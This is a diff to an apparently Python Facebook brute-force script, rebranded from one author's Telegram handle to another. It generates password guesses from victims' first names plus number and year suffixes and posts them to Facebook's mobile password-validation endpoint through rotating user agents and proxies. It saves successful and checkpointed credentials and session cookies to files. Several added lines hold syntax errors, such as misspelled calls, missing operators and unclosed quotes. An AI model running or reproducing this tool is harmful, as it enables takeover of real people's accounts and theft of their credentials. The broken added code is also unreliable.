@@ -70,24 +70,14 @@ import datetime
 now = datetime.datetime.now()
 dyar = input('NAWUT BNUSA : ')
 logo =f"""                                                                        
-\033[1;37m
-▒███████▒▓█████  ██▀███   ▒█████  
-▒ ▒ ▒ ▄▀░▓█   ▀ ▓██ ▒ ██▒▒██▒  ██▒
-░ ▒ ▄▀▒░ ▒███   ▓██ ░▄█ ▒▒██░  ██▒
-  ▄▀▒   ░▒▓█  ▄ ▒██▀▀█▄  ▒██   ██░
-▒███████▒░▒████▒░██▓ ▒██▒░ ████▓▒░
-░▒▒ ▓░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ 
-░░▒ ▒ ░ ▒ ░ ░  ░  ░▒ ░ ▒░  ░ ▒ ▒░ 
-░ ░ ░ ░ ░   ░     ░░   ░ ░ ░ ░ ▒  
-  ░ ░       ░  ░   ░         ░ ░  
-░                                 
+\033[1;37m   
 
 ------------------------------------------------
-[1;37m TELEGRAM   : ZERO_1788
+[1;37m TELEGRAM   : JG-shaba
 [1;37m Status     :  \033[1;32m                            
 ------------------------------------------------
  """
- #------------------[ DYAR ]-------------------#
+ #------------------[ shaba ]-------------------#
 import os, platform, time, sys
 time.sleep(5)
 os.system('clear')
@@ -449,64 +439,63 @@ def passwrd():
                 if len(frs)<3:
                     pass
                 else:
-                    pwv.append(frs+'12')
-                    pwv.append(frs+'123')
+                    pwv.append(nmf)
+		    pwv.appnd(frs+'123')
+                    pwv.append(frs+''+frs)
+                    pwv.append(frs+'1122334455')
+                    pwv.append(frs+'1988')
+                    pwv.append(frs+'1989')
+                    pwv.append(frs+'1990)
+                    pwv.append(frs+'1991')
+                    pwv.append(frs+'1992')
+                    pwv.append(frs+'1993')
+                    pwv.append(frs+'1994')
+                    pwv.append(frs+'1995')
+                    pwv.append(frs+'0750')
+                    pwv.append(frs+'112233')
                     pwv.append(frs+'1234')
-                    pwv.append(frs+'123@')
                     pwv.append(frs+'12345')
                     pwv.append(frs+'123456')
-                    pwv.append(frs+'112233')
-                    pwv.append(frs+frs)
-                    pwv.append(frs+'11')
-                    pwv.append(frs+'0000')
-                    pwv.append(frs+' '+frs)
-                    pwv.append(frs+'2000')
-                    pwv.append(frs+'2001‌')
-                    pwv.append(frs+'2002')
-                    pwv.append(frs+'2003')
-                    pwv.append(frs+'2004')
-                    pwv.append(frs+'2005')
-                    pwv.append(frs+'2006')
-                    pwv.append(frs+'2007')
+                    pwv.append(frs+'123456789')
+                    pwv.append(frs+'1234567890')
+                    pwv.append(frs+'4321')
+                    pwv.append(frs+'321')
+                    pwv.append(frs'54321')
                     pwv.append('123'+frs)
-                    pwv.append('1234'+frs)
-                    pwv.append('12345'+frs)
-                    pwv.append('0750'+frs)
-                    pwv.append(frs+'1234567')
-                    pwv.append(frs+'12345678')   
-                    pwv.append(frs+'123456789')   
-                    pwv.append(frs+'1234567890') 
-                    pwv.append(frs+'123'+frs)   
+                    pwv.append('1234'+frs)   
+                    pwv.append('12345+frs)   
+                    pwv.append('123456'+frs) 
             else:
                 if len(frs)<3:
                     pwv.append(nmf)
                 else:
-                    pwv.append(frs+'1234')
-                    pwv.append(frs+'123@')
-                    pwv.append(frs+'12345')
-                    pwv.append(frs+'123456')
-                    pwv.append(frs+'112233')
+                    pwv.append(nmf)
                     pwv.append(frs+frs)
-                    pwv.append(frs+'11')
-                    pwv.append(frs+'0000')
-                    pwv.append(frs+' '+frs)
-                    pwv.append(frs+'2000')
-                    pwv.append(frs+'2001‌')
-                    pwv.append(frs+'2002')
-                    pwv.append(frs+'2003')
-                    pwv.append(frs+'2004')
-                    pwv.append(frs+'2005')
-                    pwv.append(frs+'2006')
-                    pwv.append(frs+'2007')
-                    pwv.append('123'+frs)
+                    pwv.append(frs+'123')
+                    pwv.append(frs+''+frs)
+                    pwv.append('1122334455')
+                    pwv.append(frs+'1988')
+                    pwv.append(frs+'1989')
+                    pwv.append(frs+'1990')
+                    pwv.append(frs+'1991')
+                    pwv.append(frs+'1992')
+                    pwv.append(frs+'1993')
+                    pwv.append(frs+'1994')
+                    pwv.append(frs+'1995')
+                    pwv.append(frs+'0750')
+                    pwv.append(frs+'112233')
+                    pwv.append(frs+'1234')
+                    pwv.append(frs'12345')
+                    pwv.append(frs+'123456')
+                    pwv.append(frs+'123456789)
+                    pwv.append(frs+'1234567890')
+                    pwv.append(frs+'4321')
+                    pwv.append(frs+'321')   
+                    pwv.append(frs+'54321')   
+                    pwv.append('123'+frs) 
                     pwv.append('1234'+frs)
-                    pwv.append('12345'+frs)
-                    pwv.append('0750'+frs)
-                    pwv.append(frs+'1234567')
-                    pwv.append(frs+'12345678')   
-                    pwv.append(frs+'123456789')   
-                    pwv.append(frs+'1234567890') 
-                    pwv.append(frs+'123'+frs)   
+	            pwv.append('12345'+frs)
+	            pwv.append('123456'+frs)
             if 'ya' in pwpluss:
                 for xpwd in pwnya:
                     pwv.append(xpwd)
@@ -534,7 +523,7 @@ def passwrd():
 def crack(idf,pwv):
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r ZERO_UK ] {P}{k}\033[1;37m{loop}\033[1;31m{P}  {P}{H}[ok] - {ok}{P}]-{P}[{k}[cp] {cp}{x}]-[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]     ")
+    sys.stdout.write(f"\r shaba ] {P}{k}\033[1;37m{loop}\033[1;31m{P}  {P}{H}[ok] - {ok}{P}]-{P}[{k}[cp] {cp}{x}]-[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]     ")
     sys.stdout.flush()
     ua = random.choice(ugen2)
     ua2 = random.choice(ugen2)
@@ -587,7 +576,7 @@ def crack(idf,pwv):
 }
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False,proxies=proxs)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r[{b}CP-ZERO_UK✖{x}]{b} {b}{idf} | {pw}')
+                print(f'\r[{b}CP-shaba✖{x}]{b} {b}{idf} | {pw}')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
@@ -596,7 +585,7 @@ def crack(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r{x}ZERO_UK_OK✔ {H}{idf} | {pw}{ua}{M}\n')
+                print(f'\r{x}shaba-OK✔ {H}{idf} | {pw}{ua}{M}\n')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 
                 break
